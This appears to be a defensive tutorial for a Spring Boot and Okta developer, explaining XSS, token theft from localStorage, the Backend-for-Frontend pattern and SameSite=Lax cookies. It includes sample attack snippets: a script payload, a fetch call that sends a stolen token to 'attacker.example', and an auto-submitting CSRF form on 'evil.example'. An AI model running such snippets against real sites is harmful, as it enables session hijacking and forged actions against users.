## 1. What is XSS?

**XSS (Cross-Site Scripting)** is a security vulnerability where an attacker manages to execute **their own JavaScript code inside another user's browser**.

The browser trusts the website, so it also executes the attacker's script.

### Example

Suppose a website allows users to write comments.

A normal comment:

```text
This tutorial is very helpful!
```

An attacker submits:

```html
<script>
alert("Hacked!");
</script>
```

If the application displays this HTML without escaping or sanitizing it, every visitor's browser executes the script.

Instead of showing an alert, a real attacker could try to:

* Read page contents
* Send requests as the logged-in user
* Redirect the user to another website
* Steal data that is accessible to JavaScript

---

## Why are JWT tokens dangerous in an SPA?

If a React application stores a JWT in `localStorage`:

```javascript
localStorage.setItem("access_token", jwt);
```

then any JavaScript running on the page can read it:

```javascript
const token = localStorage.getItem("access_token");

fetch("https://attacker.example/steal", {
    method: "POST",
    body: token
});
```

The attacker now has the user's access token and may be able to call backend APIs until the token expires.

With the **Backend-for-Frontend (BFF)** architecture used in your project, the browser never receives the access token. It only has an opaque session cookie, so there is no JWT in `localStorage` or `sessionStorage` to steal.

> **Note:** Even with a BFF, XSS is still a serious vulnerability because malicious scripts can perform actions in the user's browser. However, they cannot steal OAuth access or refresh tokens that are never exposed to JavaScript.

---

## 2. What is `SameSite=Lax`?

`SameSite` is an attribute of an HTTP cookie that tells the browser **when it is allowed to send that cookie**.

It helps protect against **Cross-Site Request Forgery (CSRF)** attacks.

Example:

```http
Set-Cookie: JSESSIONID=abc123;
HttpOnly;
Secure;
SameSite=Lax
```

### `SameSite=Lax`

The browser sends the cookie:

* ✅ when the user is browsing your website normally
* ✅ when the user clicks a link to your website from another site
* ❌ for most background cross-site requests, such as requests triggered by another website using forms, images, or JavaScript

This greatly reduces the risk of another website causing the user's browser to perform authenticated actions on your application.

### Example

Imagine the user is logged into:

```
https://knowledge.example.com
```

Their browser has:

```
JSESSIONID=abc123
```

Now they visit a malicious website:

```
https://evil.example
```

That page tries to submit a hidden request:

```html
<form action="https://knowledge.example.com/api/questions/delete/42"
      method="POST">
</form>

<script>
document.forms[0].submit();
</script>
```

If the session cookie were sent with this request, your application might think the request came from the authenticated user.

With:

```
SameSite=Lax
```

the browser **does not send the session cookie** for this kind of cross-site POST request, so the attack fails.

---

## Common `SameSite` Values

| Value    | Description                                                                                             | Typical Usage                                                                                |
| -------- | ------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------- |
| `Strict` | Cookie is sent **only** when navigating within the same site.                                           | Highest security, but may affect usability.                                                  |
| `Lax`    | Cookie is sent for normal navigation (e.g., clicking a link), but blocked for most cross-site requests. | **Recommended default for most web applications.**                                           |
| `None`   | Cookie is sent with all requests, including cross-site requests. Must also use `Secure`.                | Required for some cross-site integrations (e.g., embedded apps, third-party identity flows). |

For a Spring Boot application using **Okta Hosted Login** and a **Backend-for-Frontend (BFF)** architecture, `HttpOnly`, `Secure`, and `SameSite=Lax` are generally a good default for the session cookie.
